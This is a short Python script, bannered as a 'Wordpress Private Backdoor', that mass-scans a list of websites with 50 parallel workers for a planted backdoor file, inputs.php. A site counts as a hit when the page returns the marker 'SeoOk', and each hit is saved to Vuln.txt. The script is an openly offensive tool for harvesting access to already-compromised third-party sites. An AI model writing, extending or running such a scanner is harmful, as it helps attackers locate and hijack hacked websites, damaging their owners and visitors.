import requests
import telepot
from multiprocessing.dummy import Pool
import os
banner = """ 
Wordpress Private Backdoor By FlashKiss
"""

def URLdomain(site):
    if not site.startswith(('http://', 'https://')):
        if not site.startswith('www.'):
            site = 'http://' + site
        else:
            site = 'http://www.' + site
    if not site.endswith('/'):
        site += '/'
    return site




def fk(site):
    headers = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36'
    }
    try:
        site = URLdomain(site)
        paths = ['inputs.php']
        for path in paths:
            url = site + path
            req = requests.get(url, headers=headers, verify=True, timeout=15)
            if "SeoOk" in req.text :
                print(" Vuln : " +site)
                open("Vuln.txt", "a").write(url + "\n")
            
            else:
                print(" Not Vuln : " +site)
    except:
        pass


def run():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

    print(banner)  
    filename = input("Enter List => ")
    try:
        with open(filename, 'r', encoding='utf-8') as file:
            sites = [line.strip() for line in file.readlines()]

    except FileNotFoundError:
        print("[!] File Not Found")
        exit()

    with Pool(50) as p:
        p.map(fk, sites)
if __name__ == "__main__":
    run()
    